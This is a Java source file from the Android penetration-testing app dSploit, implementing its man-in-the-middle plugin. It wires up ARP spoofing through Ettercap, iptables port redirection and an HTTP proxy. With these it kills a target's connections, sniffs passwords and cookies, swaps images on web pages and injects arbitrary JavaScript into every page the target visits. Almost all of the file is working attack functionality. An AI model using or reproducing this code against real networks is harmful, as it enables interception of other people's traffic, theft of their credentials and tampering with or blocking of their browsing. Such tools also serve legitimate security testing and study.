/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.util.ArrayList;

import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.core.Plugin;
import it.evilsocket.dsploit.gui.dialogs.ErrorDialog;
import it.evilsocket.dsploit.gui.dialogs.InputDialog;
import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
import it.evilsocket.dsploit.net.Target;
import it.evilsocket.dsploit.net.http.Proxy;
import it.evilsocket.dsploit.tools.Ettercap;
import it.evilsocket.dsploit.tools.Ettercap.OnReadyListener;
import it.evilsocket.dsploit.tools.IPTables;

public class MITM extends Plugin 
{
	private static final String TAG = "MITM";
	
	private ListView      	  mActionListView = null;
	private ActionAdapter 	  mActionAdapter  = null;
	private ArrayList<Action> mActions  	  = new ArrayList<Action>();	
	private Ettercap		  mEttercap		  = null;
	private IPTables		  mIpTables		  = null;
	private Proxy			  mProxy		  = null;
	
	class Action
	{
		public String 		   name;
		public String 		   description;
		public OnClickListener listener;
		
		public Action( String name, String description, OnClickListener listener )
		{
			this.name 		 = name;
			this.description = description;
			this.listener 	 = listener;
		}
	}
	
	class ActionAdapter extends ArrayAdapter<Action> 
	{
		private int 			  mLayoutId = 0;
		private ArrayList<Action> mActions;
		
		public class ActionHolder
		{		
			TextView    name;
			TextView    description;
			ProgressBar activity;
		}
		
		public ActionAdapter( int layoutId, ArrayList<Action> actions ) {
	        super( MITM.this, layoutId, actions );
	        	       
	        mLayoutId = layoutId;
	        mActions  = actions;
	    }
		
		@Override
	    public View getView( int position, View convertView, ViewGroup parent ) {		
	        View 		 row    = convertView;
	        ActionHolder holder = null;
	        
	        if( row == null )
	        {
	            LayoutInflater inflater = ( LayoutInflater )MITM.this.getSystemService( Context.LAYOUT_INFLATER_SERVICE );
	            row = inflater.inflate( mLayoutId, parent, false );
	            
	            holder = new ActionHolder();
	            
	            holder.name        = ( TextView )row.findViewById( R.id.itemName );
	            holder.description = ( TextView )row.findViewById( R.id.itemDescription );
	            holder.activity    = ( ProgressBar )row.findViewById( R.id.itemActivity );
	            
	            row.setTag(holder);
	        }
	        else
	        {
	            holder = ( ActionHolder )row.getTag();
	        }
	        
	        Action action = mActions.get( position );

	        holder.name.setText( action.name );
	        holder.description.setText( action.description );
	        
	        row.setOnClickListener( action.listener );
	        	        
	        return row;
	    }
	}
	
	public MITM( ) {
		super
		( 
		    "MITM", 
		    "Perform various man-in-the-middle attacks, such as network sniffing, traffic manipulation, etc.", 
		    new Target.Type[]{ Target.Type.ENDPOINT, Target.Type.NETWORK }, 
		    R.layout.plugin_mitm,
		    R.drawable.action_mitm_48 
	    );		
	}
	
	private void setStoppedState() {
		int rows = mActionListView.getChildCount(),
			i;
		boolean somethingIsRunning = false;
		ActionAdapter.ActionHolder holder;
		View row;
		
		for( i = 0; i < rows && somethingIsRunning == false; i++ )
		{
			if( ( row = mActionListView.getChildAt( i ) ) != null )
			{
				holder = ( ActionAdapter.ActionHolder )row.getTag();
				if( holder.activity.getVisibility() == View.VISIBLE )
					somethingIsRunning = true;
			}
		}
		
		if( somethingIsRunning )
		{
			Log.d( TAG, "Stopping current jobs ..." );
			
			ProgressDialog dialog = ProgressDialog.show( this, "", "Stopping current jobs ...", true, false );
			
			System.setForwarding( false );
			
			mEttercap.kill();
			mIpTables.undoPortRedirect( 80, 8080 );
			mProxy.stop();
			
			for( i = 0; i < rows; i++ )
			{
				if( ( row = mActionListView.getChildAt( i ) ) != null )
				{
					holder = ( ActionAdapter.ActionHolder )row.getTag();
					holder.activity.setVisibility( View.INVISIBLE );
				}
			}
			
			dialog.dismiss();
		}
	}

	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);   
        
        try
        {
	        mEttercap = new Ettercap( this );
	        mIpTables = new IPTables();
			mProxy    = new Proxy( System.getNetwork().getLoacalAddress(), 8080 );
        }
        catch( Exception e )
        {
        	Log.e( TAG, e.toString() );
        }
        
        mActions.add( new Action( "Simple Sniff", "Only redirect target's traffic through this device, useful when using a network sniffer like 'Sharp' for android.", new OnClickListener(){
			@Override
			public void onClick( View v ) 
			{
				setStoppedState();
				
				startActivity
                ( 
                  new Intent
                  ( 
                	MITM.this, 
                	Sniffer.class
                  ) 
                );
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
			}
		}));
        
        mActions.add( new Action( "Kill Connections", "Kill connections preventing everyone to reach any website or server.", new OnClickListener(){
			@Override
			public void onClick(View v) {
				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					activity.setVisibility( View.VISIBLE );
					
					Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
					
					mEttercap.spoof( System.getTarget(), new OnReadyListener(){
						@Override
						public void onReady() 
						{
							System.setForwarding( false );							
						}
						
					}).start();				
				}
				else
				{
	
					System.setForwarding( false );
					mEttercap.kill();
								
					activity.setVisibility( View.INVISIBLE );
				}
			}
		}));
        
        mActions.add( new Action( "Password & Cookies", "Sniff cookies, http, ftp and web passwords from the target.", new OnClickListener(){
        	@Override
			public void onClick( View v ) 
			{
        		setStoppedState();
        		
				startActivity
                ( 
                  new Intent
                  ( 
                	MITM.this, 
                	PasswordSniffer.class
                  ) 
                );
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
			}
		}));

        mActions.add( new Action( "Replace Images", "Replace all images on webpages with the specified one.", new OnClickListener(){
			@Override
			public void onClick(View v) {
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					new InputDialog( "Image URL", "Enter the URL of an image, starting with 'http://' :", "http://www.evilsocket.net/trollface.png", MITM.this, new InputDialogListener(){
						@Override
						public void onInputEntered( String input ) 
						{
							final String url = input.trim();
							if( url.isEmpty() == false )
							{
								activity.setVisibility( View.VISIBLE );
								
								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
													
								mEttercap.spoof( System.getTarget(), new OnReadyListener(){
									@Override
									public void onReady() 
									{
										System.setForwarding( true );
										
										mProxy.setFilter( new Proxy.ProxyFilter() {					
											@Override
											public String onHtmlReceived(String html) {
												return html.replaceAll( "src=['\"][^'\"]+\\.(jpg|jpeg|png|gif)['\"]", "src=\"" + url + "\"" );
											}
										});
										
										new Thread( mProxy ).start();
										
										mIpTables.portRedirect( 80, 8080 );									
									}
									
								}).start();				
							}
							else
								new ErrorDialog( "Error", "Invalid image url.", MITM.this ).show();
						}} 
					).show();	
				}
				else
				{					
					mEttercap.kill();
					mIpTables.undoPortRedirect( 80, 8080 );
					mProxy.stop();
					System.setForwarding( false );

					activity.setVisibility( View.INVISIBLE );
				}
			}
		}));

        mActions.add( new Action( "Script Injection", "Inject a javascript in every visited webpage.", new OnClickListener(){
			@Override
			public void onClick(View v) {
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					new InputDialog
					( 
						"Javascript", 
						"Enter the js code to inject :", 
						"<script type=\"text/javascript\">\n" +
						"  alert('This site has been hacked with dSploit!');\n" +
						"</script>", 
						MITM.this, 
						new InputDialogListener(){
						@Override
						public void onInputEntered( String input ) 
						{
							final String js = input.trim();
							if( js.isEmpty() == false || js.startsWith("<script") == false )
							{
								activity.setVisibility( View.VISIBLE );
								
								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
													
								mEttercap.spoof( System.getTarget(), new OnReadyListener(){
									@Override
									public void onReady() 
									{
										System.setForwarding( true );
										
										mProxy.setFilter( new Proxy.ProxyFilter() {					
											@Override
											public String onHtmlReceived(String html) {
												return html.replaceAll
												( 
												  "(?i)</head>",
												  js + "</head>"
												);
											}
										});
										
										new Thread( mProxy ).start();
										
										mIpTables.portRedirect( 80, 8080 );									
									}
									
								}).start();		
									
							}
							else
								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
						}} 
					).show();	
				}
				else
				{					
					mEttercap.kill();
					mIpTables.undoPortRedirect( 80, 8080 );
					mProxy.stop();
					System.setForwarding( false );

					activity.setVisibility( View.INVISIBLE );
				}
			}
		}));
        
        /*        
    	TODO:
        mActions.add( new Action( "Traffic Redirect", "Redirect every http request to a specific website.", new OnClickListener(){
			@Override
			public void onClick(View v) {
								
			}
		}));
        
        mActions.add( new Action( "Custom Filter", "Replace custom text on webpages with the specified one.", new OnClickListener(){
			@Override
			public void onClick(View v) {
								
			}
		}));
*/        
        mActionListView = ( ListView )findViewById( R.id.actionListView );
        mActionAdapter  = new ActionAdapter( R.layout.plugin_mitm_list_item, mActions );
        
        mActionListView.setAdapter( mActionAdapter );               
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();	
	    super.onBackPressed();
	}
}
